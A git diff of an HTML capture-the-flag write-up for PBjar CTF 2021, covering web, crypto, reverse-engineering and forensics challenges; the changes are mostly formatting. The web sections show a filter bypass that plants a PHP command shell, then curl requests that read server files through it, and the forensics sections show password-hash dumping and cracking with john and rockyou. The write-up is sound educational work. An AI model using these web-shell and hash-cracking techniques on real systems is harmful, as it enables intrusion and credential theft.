@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-02-05 Sat 19:58 -->
+<!-- 2022-03-23 Wed 21:01 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>PBjar ctf 2021</title>
@@ -63,17 +63,17 @@
 <h2 id="orged2c62f"><span class="section-number-2">1</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
-This weekend I competed in the PBjar ctf, where I landed on 76 place.
-Which isn't half bad if i'd say so myself.
+This weekend I competed in the PBjar ctf, where I landed on 76 place.<br>
+Which isn't half bad if i'd say so myself.<br>
 </p>
 
 <p>
-Anyway, I have here gathere write-ups for some of the challenges where i got the flag.
-I won't cover all the challenges I completed, as I didn't write notes for all of them.
+Anyway, I have here gathere write-ups for some of the challenges where i got the flag.<br>
+I won't cover all the challenges I completed, as I didn't write notes for all of them.<br>
 </p>
 
 <p>
-Hope you'll enjoy the reading, or find any of this useful one way or another.
+Hope you'll enjoy the reading, or find any of this useful one way or another.<br>
 </p>
 </div>
 </div>
@@ -81,15 +81,15 @@ Hope you'll enjoy the reading, or find any of this useful one way or another.
 <h2 id="org79b404d"><span class="section-number-2">2</span> cOrL&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
 <div class="outline-text-2" id="text-2">
 <p>
-This was a fairly easy web challenge, where you had to bypass a login form to get the flag.
-The description gave us the user name <code>admin</code>, supplying the password <code>admin</code> gives us the following message:
-<img src="assets/2021-09-18_15-59-54_screenshot.png" alt="2021-09-18_15-59-54_screenshot.png">
+This was a fairly easy web challenge, where you had to bypass a login form to get the flag.<br>
+The description gave us the user name <code>admin</code>, supplying the password <code>admin</code> gives us the following message:<br>
+<img src="assets/2021-09-18_15-59-54_screenshot.png" alt="2021-09-18_15-59-54_screenshot.png"><br>
 </p>
 
 <p>
-So if we change the request type from <code>POST</code> to <code>PUT</code>, and send the data in the body:
+So if we change the request type from <code>POST</code> to <code>PUT</code>, and send the data in the body:<br>
 </p>
-<pre class="example" id="org727cd6a">
+<pre class="example" id="org12fe776">
 PUT /index.php HTTP/1.1
 Host: 147.182.172.217:42003
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -107,16 +107,16 @@ username=admin&amp;password=admin
 </pre>
 
 
-<figure id="org78ddd3e">
-<img src="assets/2021-09-18_15-59-34_screenshot.png" alt="2021-09-18_15-59-34_screenshot.png">
+<figure id="orgc098a4b">
+<img src="assets/2021-09-18_15-59-34_screenshot.png" alt="2021-09-18_15-59-34_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>And we got the flag!</figcaption>
 </figure>
 
 <p>
-This can also be done quite easily with(as the challenge name implies), <code>curl</code>:
+This can also be done quite easily with(as the challenge name implies), <code>curl</code>:<br>
 </p>
-<pre class="example" id="org7a09203">
+<pre class="example" id="org4ad3de5">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl -X PUT "http://147.182.172.217:42003/index.php" -d "username=admin&amp;password=admin"
 
@@ -153,8 +153,8 @@ This can also be done quite easily with(as the challenge name implies), <code>cu
 <h2 id="org5cda4e4"><span class="section-number-2">3</span> ProgrammersHateProgramming&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
 <div class="outline-text-2" id="text-3">
 <p>
-This challenge was a fun PHP bypass challenge.
-The vulnerable source code was available for download, and can be seen below:
+This challenge was a fun PHP bypass challenge.<br>
+The vulnerable source code was available for download, and can be seen below:<br>
 </p>
 <div class="org-src-container">
 <pre class="src src-php">&lt;?php
@@ -175,22 +175,22 @@ if(isset($_POST["notewrite"]))
 </pre>
 </div>
 <p>
-The first that popped into my eyes were the removal of the script tags&#x2026;
-Which after trying to get an admin cookie, from a none existing admin bot, so after getting a small hint by the challenge author <a href="https://github.com/ZeroDayTea">@ZeroDayTea</a> (which boiled down to the admin bot not existing).
+The first that popped into my eyes were the removal of the script tags&#x2026;<br>
+Which after trying to get an admin cookie, from a none existing admin bot, so after getting a small hint by the challenge author <a href="https://github.com/ZeroDayTea">@ZeroDayTea</a> (which boiled down to the admin bot not existing).<br>
 </p>
 
 <p>
-I started on the PHP bypass, which you might notice isn't too difficult as the function used to get rid of bad text is <code>str_replace_first</code>.
+I started on the PHP bypass, which you might notice isn't too difficult as the function used to get rid of bad text is <code>str_replace_first</code>.<br>
 </p>
 
 <p>
-This however doesn't stop us from simply inserting an ekstra set of bad characters.
+This however doesn't stop us from simply inserting an ekstra set of bad characters.<br>
 </p>
 
 <p>
-So in burp suite I edited the <code>POST</code> request to create a simple PHP shell:
+So in burp suite I edited the <code>POST</code> request to create a simple PHP shell:<br>
 </p>
-<pre class="example" id="orgb9baf5a">
+<pre class="example" id="orgb8223c0">
 POST /addnote.php HTTP/1.1
 Host: 147.182.172.217:42002
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -217,9 +217,9 @@ echo "&lt;/pre&gt;";?&gt;
 </pre>
 
 <p>
-Then just run the following <code>curl</code> command on the newly created note:
+Then just run the following <code>curl</code> command on the newly created note:<br>
 </p>
-<pre class="example" id="org341b45e">
+<pre class="example" id="orgbf33e32">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl "http://147.182.172.217:42002/c0N8GENVYy1EwaR.php?cmd=cat%20../../../flag.php"
 Ran: cat ../../../flag.php | Ret: 0
@@ -231,8 +231,8 @@ Ran: cat ../../../flag.php | Ret: 0
 <h2 id="org8a02441"><span class="section-number-2">4</span> ProgrammersHateProgramming 2&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
 <div class="outline-text-2" id="text-4">
 <p>
-This was a follow challenge, which builds on <a href="#org5cda4e4">ProgrammersHateProgramming</a>.
-Again we have the vulnerable source code available:
+This was a follow challenge, which builds on <a href="#org5cda4e4">ProgrammersHateProgramming</a>.<br>
+Again we have the vulnerable source code available:<br>
 </p>
 <div class="org-src-container">
 <pre class="src src-php">&lt;?php
@@ -273,13 +273,13 @@ if(isset($_POST["notewrite"]))
 </div>
 
 <p>
-The compared to the previous challenge, there is an extra <code>str_replace_firt</code> call which removes the string "&lt;?".
+The compared to the previous challenge, there is an extra <code>str_replace_firt</code> call which removes the string "&lt;?".<br>
 </p>
 
 <p>
-And looking at the added <code>str_replace</code> calls, I figured that I could basically use the same PHP shell and add an extra "&lt;?".
+And looking at the added <code>str_replace</code> calls, I figured that I could basically use the same PHP shell and add an extra "&lt;?".<br>
 </p>
-<pre class="example" id="orgbdb286f">
+<pre class="example" id="org1b8cf9d">
 POST /addnote.php HTTP/1.1
 Host: 147.182.172.217:42007
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -306,9 +306,9 @@ echo "&lt;/pre&gt;";?&gt;
 </pre>
 
 <p>
-And run the following <code>curl</code> command on the new note:
+And run the following <code>curl</code> command on the new note:<br>
 </p>
-<pre class="example" id="org4c18556">
+<pre class="example" id="orgada2e10">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl "http://147.182.172.217:42007/kuvQDsVlC0ybArZ.php?cmd=cat%20../../../flag.php"
 Ran: cat ../../../flag.php | Ret: 0
@@ -320,17 +320,17 @@ Ran: cat ../../../flag.php | Ret: 0
 <h2 id="org0ab7d29"><span class="section-number-2">5</span> Hack NASA With HTML Mr. Inspector Sherlock&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
 <div class="outline-text-2" id="text-5">
 <p>
-This challenge had a flag split into 3 parts, where each part is hidden somewhere on this beautiful site:
-<img src="assets/2021-09-21_09-00-19_screenshot.png" alt="2021-09-21_09-00-19_screenshot.png">
+This challenge had a flag split into 3 parts, where each part is hidden somewhere on this beautiful site:<br>
+<img src="assets/2021-09-21_09-00-19_screenshot.png" alt="2021-09-21_09-00-19_screenshot.png"><br>
 </p>
 
 <p>
-So to the flag parts, I pulled up inspect element in firefox and went to work.
-Multiple flag parts spread throughout the site
+So to the flag parts, I pulled up inspect element in firefox and went to work.<br>
+Multiple flag parts spread throughout the site<br>
 </p>
 
 <p>
-The first part of the flag I found was actually the last part of the flag:
+The first part of the flag I found was actually the last part of the flag:<br>
 </p>
 <pre class="example">
 _a_d3t3ct1iv3????!?!?!}
@@ -338,12 +338,12 @@ _a_d3t3ct1iv3????!?!?!}
 
 
 <p>
-Which was located here in the html source.
-<img src="assets/2021-09-21_09-04-14_screenshot.png" alt="2021-09-21_09-04-14_screenshot.png">
+Which was located here in the html source.<br>
+<img src="assets/2021-09-21_09-04-14_screenshot.png" alt="2021-09-21_09-04-14_screenshot.png"><br>
 </p>
 
 <p>
-Then after clicking around on a few links, I stumbled upon the second part of the flag:
+Then after clicking around on a few links, I stumbled upon the second part of the flag:<br>
 </p>
 <pre class="example">
 I_th0ugh1_sh3l0ck_w2s
@@ -351,17 +351,17 @@ I_th0ugh1_sh3l0ck_w2s
 
 
 <p>
-Which was hard to miss, as you can see on the picture below.
-<img src="assets/2021-09-21_09-08-22_screenshot.png" alt="2021-09-21_09-08-22_screenshot.png">
+Which was hard to miss, as you can see on the picture below.<br>
+<img src="assets/2021-09-21_09-08-22_screenshot.png" alt="2021-09-21_09-08-22_screenshot.png"><br>
 </p>
 
 <p>
-The last part I was missing, which is actually the first part of the flag.
-This took a little bit of time, but eventually is I started looking at the javascript files present on the different html files.
+The last part I was missing, which is actually the first part of the flag.<br>
+This took a little bit of time, but eventually is I started looking at the javascript files present on the different html files.<br>
 </p>
 
 <p>
-The <code>old.html</code> endpoint loads the javascript file <code>animate.js</code>, which contains the first part of the flag:
+The <code>old.html</code> endpoint loads the javascript file <code>animate.js</code>, which contains the first part of the flag:<br>
 </p>
 <pre class="example">
 flag{wA1t_a_m1nUt3_
@@ -369,13 +369,13 @@ flag{wA1t_a_m1nUt3_
 
 
 
-<figure id="org2b62a50">
-<img src="assets/2021-09-21_09-15-53_screenshot.png" alt="2021-09-21_09-15-53_screenshot.png">
+<figure id="orgb3550d1">
+<img src="assets/2021-09-21_09-15-53_screenshot.png" alt="2021-09-21_09-15-53_screenshot.png"><br>
 
 </figure>
 
 <p>
-Now all that was need to do is concatenate the flag parts together:
+Now all that was need to do is concatenate the flag parts together:<br>
 </p>
 <pre class="example">
 flag{wA1t_a_m1nUt3_I_th0ugh1_sh3l0ck_w2s_a_d3t3ct1iv3????!?!?!}
@@ -386,7 +386,7 @@ flag{wA1t_a_m1nUt3_I_th0ugh1_sh3l0ck_w2s_a_d3t3ct1iv3????!?!?!}
 <h2 id="org9c358a1"><span class="section-number-2">6</span> Convert&#xa0;&#xa0;&#xa0;<span class="tag"><span class="crypto">crypto</span></span></h2>
 <div class="outline-text-2" id="text-6">
 <p>
-Convert the hexvalue in <a href="convert/file.txt">convert/file.txt</a> to ascii representation
+Convert the hexvalue in <a href="convert/file.txt">convert/file.txt</a> to ascii representation<br>
 </p>
 <pre class="example">
 666c61677b6469735f69735f615f666c346767675f68317d
@@ -394,9 +394,9 @@ Convert the hexvalue in <a href="convert/file.txt">convert/file.txt</a> to ascii
 
 
 <p>
-This can quickly be done using <code>xxd</code>:
+This can quickly be done using <code>xxd</code>:<br>
 </p>
-<pre class="example" id="org9ae28a2">
+<pre class="example" id="orgc72db7a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/convert ]
 └─&gt; $ cat convert/file.txt | xxd -r -p
 flag{dis_is_a_fl4ggg_h1}%
@@ -407,14 +407,14 @@ flag{dis_is_a_fl4ggg_h1}%
 <h2 id="org52f4eed"><span class="section-number-2">7</span> polymer&#xa0;&#xa0;&#xa0;<span class="tag"><span class="rev">rev</span></span></h2>
 <div class="outline-text-2" id="text-7">
 <p>
-In this challenge a binary was supplied.
-This binary would print a lot of text containing fake flags, an just one real flag.
+In this challenge a binary was supplied.<br>
+This binary would print a lot of text containing fake flags, an just one real flag.<br>
 </p>
 
 <p>
-To find the real flag I ran <code>strings</code> on the binary and chained a couple of <code>grep</code> calls togehter:
+To find the real flag I ran <code>strings</code> on the binary and chained a couple of <code>grep</code> calls togehter:<br>
 </p>
-<pre class="example" id="org628e48b">
+<pre class="example" id="org35b2eaf">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/polymer ]
 └─&gt; $ strings polymer | grep -o -E "flag\{[a-zA-Z0-9_]+\}" | grep -v "flag{n0t_th3_fl4g_l0l}"
 flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921}
@@ -425,24 +425,24 @@ flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921}
 <h2 id="org1c03996"><span class="section-number-2">8</span> Luna Guesser&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></h2>
 <div class="outline-text-2" id="text-8">
 <p>
-In this challenge I was given a sound file, <code>LunaGuesser.wav</code>, which if opened played a very annoying sound.
-If run through a spectrum analyzer, it looks a lot like it starts with a header before sending more data.
+In this challenge I was given a sound file, <code>LunaGuesser.wav</code>, which if opened played a very annoying sound.<br>
+If run through a spectrum analyzer, it looks a lot like it starts with a header before sending more data.<br>
 </p>
 
 <p>
-If you follow <a href="https://www.youtube.com/c/GameTheorists">The Game Theorist</a> on youtube, you might have seen his video <a href="https://www.youtube.com/watch?v=sckA6yvi-5g">Game Theory: FNF, The Bob Mod SOLVED!</a>.
-In this video they extract a picture from a sound file, sounding a lot like <code>LunaGuesser.wav</code>.
-Turns out the technology used is called Slow Scan TV, so after googling around I found and followed this guide:
-<a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a>
+If you follow <a href="https://www.youtube.com/c/GameTheorists">The Game Theorist</a> on youtube, you might have seen his video <a href="https://www.youtube.com/watch?v=sckA6yvi-5g">Game Theory: FNF, The Bob Mod SOLVED!</a>.<br>
+In this video they extract a picture from a sound file, sounding a lot like <code>LunaGuesser.wav</code>.<br>
+Turns out the technology used is called Slow Scan TV, so after googling around I found and followed this guide:<br>
+<a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a><br>
 </p>
 
 <p>
-This gave the following picture:
-<img src="assets/moon.png" alt="moon.png">
+This gave the following picture:<br>
+<img src="assets/moon.png" alt="moon.png"><br>
 </p>
 
 <p>
-The flag was the name of the place in this picture, so after googling <code>moon landing place name</code>, I found the flag to be:
+The flag was the name of the place in this picture, so after googling <code>moon landing place name</code>, I found the flag to be:<br>
 </p>
 <pre class="example">
 flag{mare_tranquillitatis}
@@ -453,12 +453,12 @@ flag{mare_tranquillitatis}
 <h2 id="org449b463"><span class="section-number-2">9</span> Stegosaurus stenops&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></h2>
 <div class="outline-text-2" id="text-9">
 <p>
-In this challenge we were given the following picture:
-<img src="assets/stegosaurus.jpg" alt="stegosaurus.jpg">
+In this challenge we were given the following picture:<br>
+<img src="assets/stegosaurus.jpg" alt="stegosaurus.jpg"><br>
 </p>
 
 <p>
-With the following challenge description:
+With the following challenge description:<br>
 </p>
 <pre class="example">
 This stenops swallowed the flag... and some unusually large rock
@@ -466,16 +466,16 @@ This stenops swallowed the flag... and some unusually large rock
 
 
 <p>
-This is obviously a clue to it being a steganography challenge, and this <i>rock</i> makes me think of the infamous <code>rockyou.txt</code> wordlist.
+This is obviously a clue to it being a steganography challenge, and this <i>rock</i> makes me think of the infamous <code>rockyou.txt</code> wordlist.<br>
 </p>
 
 <p>
-I found this small bash script, which utilizes <code>steghide</code> to launch a dictionary attack against the file.
-<a href="https://github.com/felipesi/steghide-crack">https://github.com/felipesi/steghide-crack</a>
+I found this small bash script, which utilizes <code>steghide</code> to launch a dictionary attack against the file.<br>
+<a href="https://github.com/felipesi/steghide-crack">https://github.com/felipesi/steghide-crack</a><br>
 </p>
 
 <p>
-Now all we need to do run the following command:
+Now all we need to do run the following command:<br>
 </p>
 <pre class="example">
 ./steghide-crack.sh stegosaurus.jpg $REPOS/Seclists/Passwords/Leaked-Databases/rockyou.txt
@@ -483,10 +483,10 @@ Now all we need to do run the following command:
 
 
 <p>
-And grab a cup of coffe while we wait.
-Once the script is done, we can look in the <code>output</code> file and we got the flag:
+And grab a cup of coffe while we wait.<br>
+Once the script is done, we can look in the <code>output</code> file and we got the flag:<br>
 </p>
-<pre class="example" id="org3bc97ce">
+<pre class="example" id="org4c766a8">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/stegosaurus ]
 └─&gt; $ cat output.txt                                   
 flag{ungulatus_better_than_stenops}
@@ -497,27 +497,27 @@ flag{ungulatus_better_than_stenops}
 <h2 id="org954da4a"><span class="section-number-2">10</span> tippy tappies&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></h2>
 <div class="outline-text-2" id="text-10">
 <p>
-In this challenge, the file <code>tippytappies.pcapng</code> was provided.
-Opening this file in wireshark, showed that it contained USB traffic:
-<img src="assets/2021-09-21_14-58-26_screenshot.png" alt="2021-09-21_14-58-26_screenshot.png">
+In this challenge, the file <code>tippytappies.pcapng</code> was provided.<br>
+Opening this file in wireshark, showed that it contained USB traffic:<br>
+<img src="assets/2021-09-21_14-58-26_screenshot.png" alt="2021-09-21_14-58-26_screenshot.png"><br>
 </p>
 
 <p>
-Looking closer at the data, I realised it contained keystrokes.
-But I didn't know how I would extract that data, and produce a document containing the keys captured.
+Looking closer at the data, I realised it contained keystrokes.<br>
+But I didn't know how I would extract that data, and produce a document containing the keys captured.<br>
 </p>
 
 <p>
-After googling around a bit I found the following write-up <a href="https://hackmd.io/@o7feX9hfREaSegDAEu2cAw/SkJumBtmU">Starctf - blogger</a>.
-As the write-up mentioned, we should add an extra column called "LeftoverCaptureData" before extracting the data as a csv file.
-I also added a filter, to eliminate unwanted data.
-<img src="assets/2021-09-21_15-15-04_screenshot.png" alt="2021-09-21_15-15-04_screenshot.png">
+After googling around a bit I found the following write-up <a href="https://hackmd.io/@o7feX9hfREaSegDAEu2cAw/SkJumBtmU">Starctf - blogger</a>.<br>
+As the write-up mentioned, we should add an extra column called "LeftoverCaptureData" before extracting the data as a csv file.<br>
+I also added a filter, to eliminate unwanted data.<br>
+<img src="assets/2021-09-21_15-15-04_screenshot.png" alt="2021-09-21_15-15-04_screenshot.png"><br>
 </p>
 
 <p>
-Then I exported to csv:
+Then I exported to csv:<br>
 </p>
-<pre class="example" id="org39fe5fc">
+<pre class="example" id="orgf8177da">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ head extracted_info_2.csv                                                         15:16
 "No.","Time","Source","Port","Destination","Port","Protocol","Length","Keys","Info"
@@ -533,7 +533,7 @@ Then I exported to csv:
 </pre>
 
 <p>
-And cut some more unneccessary info out with this one-liner:
+And cut some more unneccessary info out with this one-liner:<br>
 </p>
 <pre class="example">
 cat extracted_info.csv | cut -d "," -f 9 | sed ':a;N;$!ba;s/"//g' &gt; HEXDUMP.txt
@@ -541,14 +541,14 @@ cat extracted_info.csv | cut -d "," -f 9 | sed ':a;N;$!ba;s/"//g' &gt; HEXDUMP.t
 
 
 <p>
-Then I used the script provided in the write-up to convert the hexvalues into characters.
+Then I used the script provided in the write-up to convert the hexvalues into characters.<br>
 </p>
 <pre class="example">
 python key_extractor.py &gt; characters.txt
 </pre>
 
 
-<pre class="example" id="orgf8ef34f">
+<pre class="example" id="org6028c3d">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ cat characters.txt                                                                15:31
 No map found for this value: 55
@@ -563,19 +563,19 @@ RET RET RET RET RET RET RET RET RET RET RET RET RET RET RET RET RET RET RET RET 
 </pre>
 
 <p>
-As you can see there are a lot of repeated letters, it would probably be possible to write a script that cleans this up.
-But at 2 am that wasn't what was at the top of my, sleep deprived head.
+As you can see there are a lot of repeated letters, it would probably be possible to write a script that cleans this up.<br>
+But at 2 am that wasn't what was at the top of my, sleep deprived head.<br>
 </p>
 
 <p>
-So stubborn as I am, I went ahead to manually clean this up.
-I didn't finish as after doing the same thing time and time again, I was suddenly able to more or less read this.
+So stubborn as I am, I went ahead to manually clean this up.<br>
+I didn't finish as after doing the same thing time and time again, I was suddenly able to more or less read this.<br>
 </p>
 
 <p>
-Resulting in me skipping to the end where I found the flag:
+Resulting in me skipping to the end where I found the flag:<br>
 </p>
-<pre class="example" id="org7bed6af">
+<pre class="example" id="orgab7cd1a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ cat char_log.txt                                                                  15:37
 RET sudo SPC apt-get SPC update RET user RET
@@ -594,7 +594,7 @@ flag SPC wowgoodusbdetectivework RET RET RET RET RET RET RET RET RET RET RET RET
 </pre>
 
 <p>
-And the flag turned out to be:
+And the flag turned out to be:<br>
 </p>
 <pre class="example">
 flag{wowgoodusbdetectivework}
@@ -605,18 +605,18 @@ flag{wowgoodusbdetectivework}
 <h2 id="orge831fc7"><span class="section-number-2">11</span> memedium&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></h2>
 <div class="outline-text-2" id="text-11">
 <p>
-In this challenge there were provided with the <code>mememachinememory.vmem</code> file, which is a VMware memory file.
-They store a snapshot of the memory for the virtual machine.
+In this challenge there were provided with the <code>mememachinememory.vmem</code> file, which is a VMware memory file.<br>
+They store a snapshot of the memory for the virtual machine.<br>
 </p>
 
 <p>
-When doing forensics on this type of file, a popular tool to use is <code>volatility</code>. (Which can be found <a href="https://github.com/volatilityfoundation/volatility3">here</a>)
+When doing forensics on this type of file, a popular tool to use is <code>volatility</code>. (Which can be found <a href="https://github.com/volatilityfoundation/volatility3">here</a>)<br>
 </p>
 
 <p>
-Let us first get some information about the system, i'll start with the plugin <code>banners.Banners</code>, which find linux related banners:
+Let us first get some information about the system, i'll start with the plugin <code>banners.Banners</code>, which find linux related banners:<br>
 </p>
-<pre class="example" id="org7c65d1d">
+<pre class="example" id="orgd88e85d">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem banners.Banners                      
 Volatility 3 Framework 1.0.1
@@ -627,9 +627,9 @@ Offset  Banner
 </pre>
 
 <p>
-Not much to see here, so it probably runs Windows, but let's use the <code>windows.info.Info</code> plugin:
+Not much to see here, so it probably runs Windows, but let's use the <code>windows.info.Info</code> plugin:<br>
 </p>
-<pre class="example" id="org7176825">
+<pre class="example" id="orge71c3f8">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem windows.info.Info                  
 Volatility 3 Framework 1.0.1
@@ -661,10 +661,10 @@ PE Machine      332
 PE TimeDateStamp        Sun Apr 13 18:31:06 2008
 </pre>
 <p>
-Bingo!
-Now that I know the OS of the image, i'll dump the hashes using <code>windows.hashdump.Hashdump</code>:
+Bingo!<br>
+Now that I know the OS of the image, i'll dump the hashes using <code>windows.hashdump.Hashdump</code>:<br>
 </p>
-<pre class="example" id="org2002052">
+<pre class="example" id="org27563f5">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem windows.hashdump.Hashdump                           11:39
 Volatility 3 Framework 1.0.1
@@ -679,9 +679,9 @@ SUPPORT_388945a0        1002    aad3b435b51404eeaad3b435b51404ee        9546430b
 </pre>
 
 <p>
-I then took these hashes, put them into a file and formatted it to match <code>john</code> format for cracking:
+I then took these hashes, put them into a file and formatted it to match <code>john</code> format for cracking:<br>
 </p>
-<pre class="example" id="orga43177d">
+<pre class="example" id="org00e88fd">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ cat hashes.txt                                                                    11:46
 Administrator:31a5167ba5ce8351b0110a9d13636cd9
@@ -691,9 +691,9 @@ SUPPORT_388945a0:9546430bd8979312c16cb95d28bfc853
 </pre>
 
 <p>
-Then I used <code>john</code> with the wordlist <code>rockyou.txt</code>, hoping that it would contain the right password:
+Then I used <code>john</code> with the wordlist <code>rockyou.txt</code>, hoping that it would contain the right password:<br>
 </p>
-<pre class="example" id="orge32ecca">
+<pre class="example" id="orgabc68f1">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ john --rules=all --wordlist=$REPOS/SecLists/Passwords/Leaked-Databases/rockyou.txt --format=NT hashes.txt
 --------------------------------------------------------------------------
@@ -720,8 +720,8 @@ Session aborted
 </pre>
 
 <p>
-And I got a hit on the password: <code>superman83</code>.
-Meaning the flag is:
+And I got a hit on the password: <code>superman83</code>.<br>
+Meaning the flag is:<br>
 </p>
 <pre class="example">
 flag{superman83}
@@ -733,16 +733,16 @@ flag{superman83}
 <h2 id="orge23d88d"><span class="section-number-2">12</span> Mr. Robot and Friends&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></h2>
 <div class="outline-text-2" id="text-12">
 <p>
-In this challenge, I had to find the name of the person which sent a phising mail.
-The challenge provided the file <code>mrrobotandfriends.vmss</code>, which is a VMware Suspended State file.
-Which more or less means that it is a suspended virtual machine.
+In this challenge, I had to find the name of the person which sent a phising mail.<br>
+The challenge provided the file <code>mrrobotandfriends.vmss</code>, which is a VMware Suspended State file.<br>
+Which more or less means that it is a suspended virtual machine.<br>
 </p>
 
 <p>
-I started of the same way as <a href="#orge831fc7">memedium</a>, with trying to identify the OS.
-Altough I had some problems using <code>volatility3</code> on this challenge, so I used <code>volatility2</code> instead.
+I started of the same way as <a href="#orge831fc7">memedium</a>, with trying to identify the OS.<br>
+Altough I had some problems using <code>volatility3</code> on this challenge, so I used <code>volatility2</code> instead.<br>
 </p>
-<pre class="example" id="org7c29f06">
+<pre class="example" id="orgaf81528">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss imageinfo                                        12:10
 Volatility Foundation Volatility Framework 2.6.1
@@ -764,9 +764,9 @@ INFO    : volatility.debug    : Determining profile based on KDBG search...
 </pre>
 
 <p>
-Now that I know the profile, I'll list the processes running:
+Now that I know the profile, I'll list the processes running:<br>
 </p>
-<pre class="example" id="orgc2d44c4">
+<pre class="example" id="org86cfb02">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss --profile=Win7SP1x86_23418 pslist                12:11
 Volatility Foundation Volatility Framework 2.6.1
@@ -818,10 +818,10 @@ Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Star
 </pre>
 
 <p>
-Since we want the email of the attacker, a good bet would be to look at the memory of the outlook process.
-This can be dumped using the <code>memdump</code> plugin, with the <code>PID</code> of the outlook  process.
+Since we want the email of the attacker, a good bet would be to look at the memory of the outlook process.<br>
+This can be dumped using the <code>memdump</code> plugin, with the <code>PID</code> of the outlook  process.<br>
 </p>
-<pre class="example" id="orgc1054a3">
+<pre class="example" id="org9da54bf">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss --profile=Win7SP1x86_23418 memdump -p 3196 -D .  12:21
 Volatility Foundation Volatility Framework 2.6.1
@@ -830,9 +830,9 @@ Writing OUTLOOK.EXE [  3196] to 3196.dmp
 </pre>
 
 <p>
-Now we can use <code>strings</code> in a combination with <code>grep</code> to search for what we want:
+Now we can use <code>strings</code> in a combination with <code>grep</code> to search for what we want:<br>
 </p>
-<pre class="example" id="orgb181741">
+<pre class="example" id="org16d63d2">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ strings 3196.dmp | grep -E "([a-zA-Z0-9_]\w+)@([a-zA-Z0-9_]\w+)\.([a-zA-Z0-9_]\w+)" | grep -v "allsafecybersec" 
 SMTP:TH3WH1T3R0S3@GMAIL.COM
@@ -864,7 +864,7 @@ nd@netcenter.dll,-1pad.exe
 </pre>
 
 <p>
-On line 6 we can see the name of the attacker, which coincidentally also is the flag(with space replace by "_"):
+On line 6 we can see the name of the attacker, which coincidentally also is the flag(with space replace by "_"):<br>
 </p>
 <pre class="example">
 flag{The_Whit3R0s3}
